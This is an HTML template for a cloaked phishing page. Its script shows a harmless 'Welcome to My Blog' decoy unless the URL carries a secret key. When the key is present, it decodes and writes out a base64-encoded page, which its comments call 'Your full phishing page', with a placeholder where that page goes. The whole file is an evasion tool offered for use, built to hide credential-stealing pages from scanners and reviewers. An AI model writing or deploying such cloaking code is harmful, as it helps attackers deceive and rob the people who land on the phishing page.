<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
    .loader { text-align: center; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .decoy { display: none; }
  </style>
</head>
<body>
  <div id="decoy" class="decoy">
    <h1>Welcome to My Blog</h1>
    <p>This is a harmless page about technology.</p>
  </div>
  <div id="loader" class="loader">
    <div class="spinner"></div>
    <p>Loading...</p>
  </div>

  <script>
    // ========================================
    // 1. Check if the URL contains the secret key
    // ========================================
    function getParameterByName(name) {
      const url = window.location.href;
      const regex = new RegExp('[?&]' + name + '=([^&#]*)');
      const results = regex.exec(url);
      return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }

    const secretKey = getParameterByName('key');

    // ========================================
    // 2. If the key matches, show the phishing page
    // ========================================
    if (secretKey === 'supersecret123') {
      // Replace this with your actual obfuscated page
      var encodedData = "YOUR_BASE64_ENCODED_HTML"; // Your full phishing page

      try {
        var decodedHtml = atob(encodedData);
        document.open();
        document.write(decodedHtml);
        document.close();
      } catch(e) {
        document.body.innerHTML = '<p style="color:red;">Error loading page.</p>';
      }
    } else {
      // ========================================
      // 3. If the key is missing or wrong, show the decoy
      // ========================================
      document.getElementById('loader').style.display = 'none';
      document.getElementById('decoy').style.display = 'block';
    }
  </script>
</body>
</html>
